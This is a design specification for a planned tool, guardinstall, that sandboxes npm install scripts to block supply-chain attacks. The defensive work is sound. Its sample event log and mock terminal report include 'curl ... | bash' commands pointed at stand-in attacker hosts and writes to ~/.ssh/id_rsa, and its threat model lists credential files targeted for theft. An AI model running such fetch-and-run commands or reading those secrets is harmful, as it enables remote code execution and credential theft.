# guardinstall — Build Specification

> A kernel-level behavioral sandbox for npm/pnpm/bun install scripts.  
> Catches supply chain attacks at install time — before they execute.

| | |
|---|---|
| **Stack** | TypeScript + Rust (napi-rs) |
| **Platforms** | Linux · macOS · Windows |
| **Build Timeline** | ~12 weeks to MVP |
| **Status** | Unbuilt · Open Problem |
| **Existing Alternatives** | None with runtime behavioral sandboxing |

---

## Table of Contents

1. [The Problem](#1-the-problem)
2. [Why Now](#2-why-now)
3. [Threat Model](#3-threat-model)
4. [System Architecture](#4-system-architecture)
5. [Layer 1 — CLI Wrapper](#5-layer-1--cli-wrapper)
6. [Layer 2 — Behavioral Sandbox](#6-layer-2--behavioral-sandbox)
7. [Layer 3 — Policy Engine](#7-layer-3--policy-engine)
8. [Project Structure](#8-project-structure)
9. [Build Phases](#9-build-phases)
10. [Comparison](#10-comparison)
11. [Open Problems](#11-open-problems)

---

## 1. The Problem

Every time a developer runs `npm install`, Node.js silently executes arbitrary shell scripts from every package in the dependency tree — including transitive ones the developer has never read, reviewed, or knowingly installed.

This is the **postinstall attack surface**. It is the primary vector for npm supply chain attacks, and it is completely undefended in the current ecosystem.

### Scale of the problem

| Metric | Value |
|---|---|
| Secrets leaked in 2025 s1ngularity attack | 2,000+ |
| Installs of `twilio-npm` before removal | 370 |
| Top-500 npm packages with install scripts | ~30% |

### What currently happens

When you run `npm install express`, npm resolves the full dependency graph — often 100+ packages — and runs any `preinstall`, `install`, or `postinstall` scripts defined in each package's `package.json`. These scripts run **as your user, with your full filesystem and network access**. There is no sandbox. There is no confirmation. There is no audit log.

> **Core Vulnerability:** A malicious package can, during a silent `postinstall`: read your `~/.ssh/`, exfiltrate your `.env` files, install a persistent backdoor, steal your npm auth token, or pivot to other running processes — all before you see any output in your terminal.

### Why existing solutions fail

**`--ignore-scripts`** disables all install scripts globally. This breaks legitimate native addons like `esbuild`, `sharp`, `node-gyp`, and `canvas` that require postinstall compilation steps. Not a practical solution for real projects.

**Socket.dev** performs static code analysis on packages before install. Valuable, but fundamentally limited — it cannot detect logic bombs, time-delayed payloads, environment-variable-triggered behavior, or anything that depends on runtime context.

**Snyk / npm audit** check packages against a known vulnerability database. They only catch *known* threats that have already been discovered and reported. Entirely reactive.

---

## 2. Why Now

Three converging trends make this both more urgent and more buildable than ever before.

**Attack frequency is rising.** The 2025 s1ngularity, debug/chalk compromise, and Shai-Hulud incidents happened within the same year. Threat actors have realized npm is a high-value, low-friction attack surface.

**AI coding means more blind installs.** AI agents like Claude Code, Copilot, and Cursor automatically run `npm install` based on LLM suggestions. Developers increasingly install packages without reviewing them first.

**Linux primitives are mature.** Linux namespaces, seccomp-BPF, and Landlock are production-stable in all modern kernels. `napi-rs` makes it practical to expose these from a TypeScript-friendly native addon.

**Node.js Permission Model.** Node.js v20+ ships a built-in Permission Model, signaling that the ecosystem is ready for runtime constraints. This creates a cultural and technical moment to build on top of it.

---

## 3. Threat Model

guardinstall specifically defends against **install-time attacks** — malicious behavior that triggers during `npm install`, not at runtime. This is a distinct and underserved category.

### In scope — what we block

- **Data exfiltration:** postinstall scripts that read `~/.ssh/`, `.env`, `~/.npmrc`, `~/.aws/credentials` and upload them to a remote server
- **Shell injection:** scripts that spawn `bash`, `sh`, `curl | bash`, or unrelated processes
- **Filesystem poisoning:** scripts that write outside their package directory to inject code or plant startup scripts
- **Dependency confusion attacks:** packages that make network calls to verify they're in a target environment before activating
- **Logic bombs:** code that checks environment variables, hostname, or other conditions before exfiltrating — the one thing static analysis fundamentally cannot catch
- **Crypto-miners:** install scripts that download and execute mining binaries

### Out of scope — what we don't handle

- Runtime attacks in application code (use runtime app protection tools)
- Malicious code in package JS files that only triggers when `require()`d
- Source-level backdoors that pass static analysis (addressed by Socket.dev)
- Social engineering / typosquatting name attacks (addressed by npm audit)

> **Design Principle:** guardinstall is not trying to replace Socket.dev or npm audit. It fills a specific gap: **behavioral detection at the moment of execution**. All three tools are complementary and can run together in CI.

---

## 4. System Architecture

guardinstall is a three-layer system. Each layer has a distinct responsibility and is independently testable.

```
Developer runs:  $ npx guardinstall add express
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1 — CLI WRAPPER  (TypeScript/Node.js)            │
│                                                         │
│  • Intercepts install command                           │
│  • Resolves full dep tree via arborist                  │
│  • Identifies packages with install scripts             │
│  • Orchestrates sandbox invocations                     │
│  • Renders human-readable report                        │
└─────────────────────┬───────────────────────────────────┘
                      │  spawns one process per install script
                      ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 2 — BEHAVIORAL SANDBOX  (Rust / napi-rs)         │
│                                                         │
│  Linux:   seccomp-BPF + Linux namespaces + Landlock     │
│  macOS:   sandbox-exec (Seatbelt profiles)              │
│  Windows: Job Objects + restricted tokens               │
│                                                         │
│  Blocks / audits:                                       │
│    network  →  connect(), bind(), socket(AF_INET)       │
│    exec     →  execve(), execveat()                     │
│    fs write →  writes outside /tmp & package dir        │
│    ptrace   →  anti-sandbox / debugger detection        │
│                                                         │
│  Emits: structured syscall log (JSON)                   │
└─────────────────────┬───────────────────────────────────┘
                      │  structured JSON event stream
                      ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 3 — POLICY ENGINE  (TypeScript)                  │
│                                                         │
│  • Loads community behavior profiles per package        │
│  • Scores anomalies by severity (critical/warn/info)    │
│  • Applies allowlist for known-good packages            │
│  • Interactive prompt in dev / fail-fast in CI          │
│  • Submits new observations to community DB             │
└─────────────────────────────────────────────────────────┘
```

---

## 5. Layer 1 — CLI Wrapper

The CLI is written in TypeScript and published to npm as `guardinstall`. It is the developer-facing entry point and must feel fast and transparent.

### Entry points

```sh
# Drop-in replacement for package manager commands
npx guardinstall add express            # npm add
npx guardinstall install                # npm install (full dep tree)
npx guardinstall --pm pnpm add lodash   # use pnpm under the hood
npx guardinstall --ci install           # CI mode: fail instead of prompt
npx guardinstall audit                  # scan existing node_modules
```

### Dependency tree resolution

Use npm's own `@npmcli/arborist` to resolve the full dependency graph, identical to what npm itself uses. For each node in the tree, check if `package.json` has any of: `preinstall`, `install`, or `postinstall` in `scripts`.

```typescript
import Arborist from '@npmcli/arborist'

async function getInstallScripts(projectRoot: string) {
  const arb = new Arborist({ path: projectRoot })
  const tree = await arb.loadVirtual()

  const packagesWithScripts: PackageInfo[] = []

  for (const node of tree.inventory.values()) {
    const scripts = node.package?.scripts ?? {}
    const hasInstallScript = ['preinstall', 'install', 'postinstall']
      .some(s => s in scripts)

    if (hasInstallScript) {
      packagesWithScripts.push({
        name: node.name,
        version: node.version,
        scripts: pick(scripts, ['preinstall', 'install', 'postinstall']),
        path: node.path,
        isNew: !isInLockfile(node.name, node.version)
      })
    }
  }

  return packagesWithScripts
}
```

### Key design decisions

**Skip packages already in lockfile.** If a package version hasn't changed, it's already been run through the sandbox on a previous install. Don't re-sandbox it — critical performance optimization.

**Parallelize sandbox invocations.** Packages with install scripts are independent of each other before installation. Run up to 4 sandboxes concurrently.

**Fail fast in CI mode.** In `--ci` mode, any `CRITICAL` finding exits with code `1` immediately without prompting.

**Progressive disclosure.** Show a live progress bar. Don't block the terminal silently — developers should see what's being checked.

---

## 6. Layer 2 — Behavioral Sandbox

This is the technical core. Written in Rust using `napi-rs` so it compiles to a native Node.js addon. The sandbox wraps each install script execution in kernel-enforced constraints.

### Linux implementation (primary)

Uses three Linux security primitives in combination:

**Linux Namespaces** — Create a new network namespace for each sandboxed process. The process has no network interfaces — all `connect()` calls fail with `ENETUNREACH`. This alone blocks the most common attack pattern (exfiltrate data to remote server).

**seccomp-BPF Syscall Filter** — A BPF program attached to the process that intercepts syscalls and applies an allowlist. Suspicious syscalls (`execve`, `ptrace`, `socket` to `AF_INET`) either return `EPERM` or trigger a `SIGSYS` signal that guardinstall catches and logs.

**Landlock LSM** — A Linux Security Module (available since kernel 5.13) that restricts filesystem access. Grants read-only access to most of the filesystem, and read-write access only to `/tmp` and the package's own directory. Writes to `~/.ssh`, `~/.aws`, etc. return `EPERM`.

### The seccomp filter (Rust)

```rust
use seccompiler::{BpfProgram, SeccompAction, SeccompFilter, SeccompRule};

fn build_install_sandbox_filter() -> Result<BpfProgram> {
    let filter = SeccompFilter::new(
        // Default action: allow (only block specific dangerous syscalls)
        SeccompAction::Allow,
        SeccompAction::KillProcess,  // if arch mismatch
        vec![
            // Block new process spawning
            (libc::SYS_execve,   vec![SeccompRule::new(SeccompAction::Trace(1))?]),
            (libc::SYS_execveat, vec![SeccompRule::new(SeccompAction::Trace(2))?]),

            // Block raw network socket creation
            // (network namespace handles this, but seccomp is a second layer)
            (libc::SYS_socket, vec![
                SeccompRule::new(SeccompAction::Trace(3))?
                    .add_condition(0, SeccompCmpOp::Eq, AF_INET as u64)?
            ]),

            // Block ptrace (anti-sandbox detection)
            (libc::SYS_ptrace, vec![SeccompRule::new(SeccompAction::Errno(libc::EPERM))?]),
        ]
    )?;

    filter.try_into()
}
```

### Event emission

Every intercepted syscall is emitted as structured JSON over a Unix socket to the parent CLI process. This is the audit log and the input to the policy engine.

```json
{
  "event": "syscall_intercepted",
  "package": "malicious-pkg@1.0.0",
  "syscall": "execve",
  "args": ["/bin/sh", ["-c", "curl http://evil.com/steal.sh | bash"]],
  "action": "blocked",
  "timestamp_ns": 1746547200000
}

{
  "event": "fs_write_attempt",
  "package": "malicious-pkg@1.0.0",
  "path": "/home/user/.ssh/id_rsa",
  "action": "blocked",
  "timestamp_ns": 1746547200100
}
```

### macOS implementation

macOS ships a sandboxing framework called **Seatbelt** (`sandbox-exec`). We generate a per-execution sandbox profile and use `sandbox-exec` to run the install script. Weaker than Linux namespaces (no network namespaces), but still catches filesystem access and outbound network calls.

```scheme
; Generated Seatbelt profile for package: some-pkg@1.2.3
(version 1)
(deny default)
(allow file-read*)
(allow file-write*
  (subpath "/tmp")
  (subpath "/path/to/node_modules/some-pkg"))
(deny network*)          ; block all network
(allow process-exec      ; only allow node itself
  (literal "/usr/local/bin/node"))
```

### Windows implementation

Uses Job Objects with a restricted token to limit process spawning and resource access. Network isolation requires the Windows Filtering Platform (WFP) which needs elevated privileges — so the Windows MVP is **detect and alert** rather than hard-block. Full blocking comes in a later release.

### Handling legitimate native addons

Tools like `esbuild`, `sharp`, and `node-gyp` legitimately need to download platform-specific binaries or compile C++ during postinstall. guardinstall handles this via a tiered approach:

- **Community allowlist:** well-known packages with documented install behavior are pre-approved via the `policies/` database
- **Behavioral comparison:** if a package's observed behavior exactly matches its stored profile, it passes without a prompt — even if it makes network calls
- **Deviation alerts:** if `esbuild` suddenly starts writing to `~/.ssh/` (account compromised), that deviates from its stored profile and triggers an alert

---

## 7. Layer 3 — Policy Engine

The policy engine consumes the JSON event stream from the sandbox and produces a human-readable security verdict.

### Scoring model

```typescript
type Severity = 'CRITICAL' | 'HIGH' | 'WARN' | 'INFO'

const SCORING_RULES: ScoringRule[] = [
  {
    match: e => e.syscall === 'execve' && isCurlOrWget(e.args),
    severity: 'CRITICAL',
    message: 'Attempted to download and execute remote code'
  },
  {
    match: e => e.syscall === 'connect' && isExternalIP(e.args.addr),
    severity: 'HIGH',
    message: 'Attempted outbound network connection during install'
  },
  {
    match: e => e.event === 'fs_write_attempt' && isSensitivePath(e.path),
    severity: 'CRITICAL',
    message: 'Attempted to write to sensitive path: ' + e.path
  },
  {
    match: e => e.event === 'fs_write_attempt' && !isPackagePath(e.path),
    severity: 'WARN',
    message: 'Wrote outside package directory'
  },
  {
    match: e => e.syscall === 'connect' && isLocalhostOrCDN(e.args.addr),
    severity: 'INFO',
    message: 'Connected to trusted host (CDN/localhost)'
  }
]
```

### Terminal output format

```
  ⚠  BLOCKED  some-malicious-pkg@2.1.0

  postinstall script attempted the following:

  [CRITICAL]  execve("/bin/sh", ["-c", "curl https://evil.io/c2.sh | bash"])
              → Shell spawned a remote code download. Blocked.

  [HIGH]      connect() to 185.220.101.47:443
              → Outbound TCP to unknown IP during install. Blocked.

  [CRITICAL]  write("/home/you/.ssh/id_rsa")
              → Attempted to read SSH private key. Blocked.

  This package was installed for the first time (not in lockfile).
  Published 3 days ago. 12 weekly downloads.

  Allow anyway and install?  [y/N]
```

### Community policy database

A git repository (`guardinstall/policies`) contains behavior profiles for well-known packages, similar to how DefinitelyTyped works for `@types/*`. Each profile describes the expected syscall behavior of a package's install script.

```json
{
  "package": "esbuild",
  "versions": ">=0.18.0",
  "maintainers_verified": true,
  "expected_behavior": {
    "network": {
      "allowed_hosts": ["registry.npmjs.org", "cdn.esbuild.dev"],
      "reason": "Downloads platform-specific binary from CDN"
    },
    "filesystem": {
      "writes": ["./bin/esbuild"],
      "reason": "Writes downloaded binary to package bin/ directory"
    },
    "exec": false
  }
}
```

---

## 8. Project Structure

```
guardinstall/
├── packages/
│   ├── cli/                          # TypeScript — developer entry point
│   │   ├── src/
│   │   │   ├── index.ts              # CLI entrypoint (commander.js)
│   │   │   ├── resolver.ts           # arborist dep tree walker
│   │   │   ├── orchestrator.ts       # parallel sandbox invocation
│   │   │   ├── reporter.ts           # terminal output & prompts
│   │   │   └── lockfile.ts           # detect new vs existing packages
│   │   └── package.json
│   │
│   ├── sandbox/                      # Rust — native syscall interceptor
│   │   ├── src/
│   │   │   ├── lib.rs                # napi-rs entry, exports to Node
│   │   │   ├── linux/
│   │   │   │   ├── seccomp.rs        # BPF filter construction
│   │   │   │   ├── namespaces.rs     # network/mount/pid namespace setup
│   │   │   │   └── landlock.rs       # filesystem restriction
│   │   │   ├── macos/
│   │   │   │   └── seatbelt.rs       # sandbox-exec profile generator
│   │   │   ├── windows/
│   │   │   │   └── job_objects.rs    # Windows Job Object isolation
│   │   │   └── events.rs             # JSON event emission over Unix socket
│   │   ├── Cargo.toml
│   │   └── package.json
│   │
│   ├── policy-engine/                # TypeScript — scoring + verdict
│   │   ├── src/
│   │   │   ├── engine.ts             # main scoring logic
│   │   │   ├── rules.ts              # scoring rule definitions
│   │   │   ├── allowlist.ts          # community profile loader
│   │   │   └── reporter.ts           # verdict formatter
│   │   └── package.json
│   │
│   └── policies/                     # Community behavior profiles
│       ├── esbuild.json
│       ├── sharp.json
│       ├── canvas.json
│       └── node-gyp.json
│
├── .github/workflows/
│   ├── ci.yml                        # test on linux-x64, linux-arm64, darwin, win32
│   ├── build-native.yml              # cross-compile Rust native binaries
│   └── publish.yml                   # publish to npm with prebuilt binaries
│
├── README.md
├── pnpm-workspace.yaml
└── CONTRIBUTING.md                   # how to add policy profiles
```

---

## 9. Build Phases

### Phase 1 — CLI Foundation (Weeks 1–2)

Build the TypeScript CLI that resolves the dependency tree and identifies install scripts. No sandbox yet — focus on the arborist integration and output UI. This phase is independently useful as a simple auditor.

- [ ] Set up pnpm monorepo with changesets for versioning
- [ ] Integrate `@npmcli/arborist` to walk the dep tree
- [ ] List all packages with install scripts (name, version, script content)
- [ ] Detect new packages vs. those already in lockfile
- [ ] Build terminal reporter using `ink` or `chalk`
- [ ] Wire up `--pm pnpm`, `--pm bun`, `--pm npm` flags
- [ ] Integration test: run against a real project, assert correct packages found

**Exit criteria:** `npx guardinstall install` prints a table of all packages with install scripts in a real project, correctly marking which are new vs. in the lockfile.

---

### Phase 2 — Linux Sandbox Core (Weeks 3–6)

This is the hardest phase. Build the Rust native addon with Linux namespace isolation and seccomp-BPF filtering. Linux-only first. Get event emission working end-to-end.

- [ ] Set up `napi-rs` project with cross-compilation config
- [ ] Implement Linux network namespace isolation (no network access)
- [ ] Implement seccomp-BPF filter for `execve`, `socket`, `ptrace`
- [ ] Implement Landlock filesystem restriction (requires kernel ≥ 5.13)
- [ ] Wire Unix socket event emission from Rust → Node.js
- [ ] Test against known-malicious postinstall scripts (write test fixtures)
- [ ] Verify legitimate packages (`esbuild`, `node-gyp`) pass with correct policy
- [ ] Measure overhead: target < 200ms per sandbox invocation

**Exit criteria:** A test fixture with a malicious postinstall script is blocked. `esbuild`'s postinstall completes normally. Sandbox overhead < 200ms per package.

---

### Phase 3 — Policy Engine + UX (Weeks 7–8)

Build the scoring system and connect all three layers end-to-end. This phase makes the tool actually usable for the first time.

- [ ] Implement scoring rules (CRITICAL / HIGH / WARN / INFO)
- [ ] Build allowlist loader from `policies/` directory
- [ ] Build interactive terminal prompt for dev mode
- [ ] Build fail-fast CI mode (`--ci` flag, exit code 1)
- [ ] Write behavior profiles for top 20 packages with install scripts
- [ ] Add `guardinstall audit` command to scan existing `node_modules`
- [ ] End-to-end test: install a malicious package, assert it is blocked

**Exit criteria:** Running `npx guardinstall add <malicious-package>` produces a formatted report, prompts the developer, and blocks the install on confirmation. CI mode exits 1 without prompting.

---

### Phase 4 — Cross-Platform Support (Weeks 9–10)

Add macOS and Windows sandbox backends. Weaker than Linux but still catches the majority of real attacks.

- [ ] macOS: implement Seatbelt profile generation and `sandbox-exec` invocation
- [ ] macOS: verify network blocking via `(deny network*)`
- [ ] Windows: implement Job Object + restricted token
- [ ] Windows: implement detect-and-alert mode (no hard block, log attempts)
- [ ] Set up GitHub Actions matrix build for all 4 targets
- [ ] Publish pre-built native binaries as optional npm dependencies

**Exit criteria:** `guardinstall` installs and runs correctly on macOS (Apple Silicon + Intel) and Windows 11. A malicious postinstall network call is detected and reported on all platforms.

---

### Phase 5 — Community & Ecosystem (Weeks 11–12)

Open source the project, establish the community policy database, and write CI integration guides.

- [ ] Open source on GitHub under MIT license
- [ ] Write `CONTRIBUTING.md` for adding policy profiles
- [ ] Publish behavior profiles for top 100 packages with install scripts
- [ ] Write GitHub Actions integration guide
- [ ] Write GitLab CI integration guide
- [ ] Add `--json` output flag for machine-readable CI reports
- [ ] Add Slack/webhook notification support for CI mode

**Exit criteria:** The project is public. A contributor can submit a new policy profile via PR using documented instructions. GitHub Actions example config works out of the box.

---

## 10. Comparison

| Capability | npm audit | Socket.dev | `--ignore-scripts` | **guardinstall** |
|---|---|---|---|---|
| Catches known malware | ✅ | ✅ | ✅ (never runs) | ✅ |
| Catches logic bombs | ❌ | ❌ | ✅ | ✅ |
| Catches obfuscated payloads | ❌ | ⚠️ partial | ✅ | ✅ |
| Catches time-delayed attacks | ❌ | ❌ | ✅ | ✅ |
| Works with native addons | ✅ | ✅ | ❌ breaks them | ✅ |
| Real-time blocking | ❌ | ⚠️ pre-install only | ✅ | ✅ |
| No account required | ✅ | ❌ | ✅ | ✅ |
| Open source | ✅ | ❌ | ✅ | ✅ |
| Developer-friendly UX | ✅ | ✅ | ❌ breaks projects | ✅ |
| **Kernel-level behavioral sandbox** | **❌** | **❌** | **❌** | **✅ only one** |

---

## 11. Open Problems

These are the genuinely unsolved design challenges. Document them early to avoid wasted work.

### 1. Overhead on large installs

A project with 500 dependencies might have 80 packages with install scripts. Sandboxing all 80 sequentially adds significant time to `npm install`.

**Mitigations to explore:**
- Run up to 8 sandboxes in parallel (install scripts are independent before install)
- Skip packages already in lockfile (eliminates the common case on re-installs)
- Use a shared namespace pool instead of creating fresh namespaces per process
- Cache sandbox results keyed on `package-name@version` + script hash

### 2. Cross-compilation of the Rust native addon

Distributing a Rust-based native addon means compiling for `linux-x64`, `linux-arm64`, `darwin-x64`, `darwin-arm64`, and `win32-x64`. Use GitHub Actions with cross-compilation toolchains via `napi-rs`'s official CI templates. Built binaries are published as optional npm dependencies.

Note: guardinstall's own install script (if any) will need to be in its own allowlist — a bootstrapping problem to design around early.

### 3. Keeping the policy database fresh

If `esbuild` releases a new version that changes where it downloads its binary from, guardinstall will block it until the policy is updated. This requires a community workflow similar to DefinitelyTyped PRs, plus fast release cycles for the `policies` package. Consider auto-fetching policy updates from a CDN separately from npm install.

### 4. False positive tolerance

If guardinstall blocks too many legitimate packages, developers will disable it. The default policy needs to be permissive enough to not interrupt daily workflows, while strict enough to catch real attacks. This requires extensive testing against the npm top-500 packages with install scripts **before public release**.

> **Critical Risk:** The single biggest risk is blocking a popular package like `puppeteer` or `node-sass` on a developer's machine. That one false positive will generate a GitHub issue, a tweet, and a wave of uninstalls. The policy database must be thorough before the first public release.

### 5. Windows network isolation

Windows Job Objects can restrict process spawning and CPU/memory, but network isolation requires the Windows Filtering Platform (WFP) which needs admin privileges — unacceptable for a developer tool. The realistic Windows MVP is detect-and-alert rather than hard-block. Full network blocking on Windows is a post-MVP problem.

---

## Dependencies

| Package | Purpose | Layer |
|---|---|---|
| `@npmcli/arborist` | Dependency tree resolution | CLI |
| `commander` | CLI argument parsing | CLI |
| `ink` or `chalk` | Terminal output formatting | CLI |
| `napi-rs` | Rust → Node.js native addon bridge | Sandbox |
| `seccompiler` (Rust crate) | seccomp-BPF filter construction | Sandbox |
| `nix` (Rust crate) | Linux namespace APIs | Sandbox |
| `landlock` (Rust crate) | Landlock LSM bindings | Sandbox |
| `semver` | Policy version range matching | Policy Engine |

## Kernel Requirements

| Platform | Minimum Version | Notes |
|---|---|---|
| Linux (seccomp-BPF) | Kernel 3.5+ | Available everywhere in practice |
| Linux (Landlock) | Kernel 5.13+ | Ubuntu 22.04+, Fedora 35+, Debian 12+ |
| macOS (Seatbelt) | macOS 10.5+ | Available on all supported macOS versions |
| Windows (Job Objects) | Windows Vista+ | Available everywhere |

---

*guardinstall · Build Specification v1.0 · May 2026*
